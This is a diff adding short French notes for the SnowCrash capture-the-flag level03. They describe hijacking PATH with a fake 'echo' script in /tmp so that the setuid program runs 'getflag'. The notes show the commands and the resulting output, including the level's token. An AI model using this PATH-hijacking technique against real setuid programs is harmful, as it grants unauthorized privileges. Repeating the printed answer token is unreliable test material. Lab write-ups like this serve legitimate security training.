@@ -1,1 +1,15 @@
-il faut rajouter dans le path un chemin vers un programme s'appelant echo contanant la fonction getflag. Le programme level03 ayant les droits de flag03
+il faut rajouter dans le path un chemin vers un programme s'appelant echo contanant la fonction getflag. Le programme level03 ayant les droits de flag03 on recuperera le token.
+
+1 creer un fichier nommer echo s'appelant echo dans le dossier /tmp
+!#/bin/bash
+
+getflag
+
+2 chmod 777 echo
+
+3 PATH="/tmp:$PATH"
+
+4 executer le programme level03
+level03@SnowCrash:~$ ./level03
+/tmp/echo: 1: /tmp/echo: !#/bin/bash: Permission denied
+Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
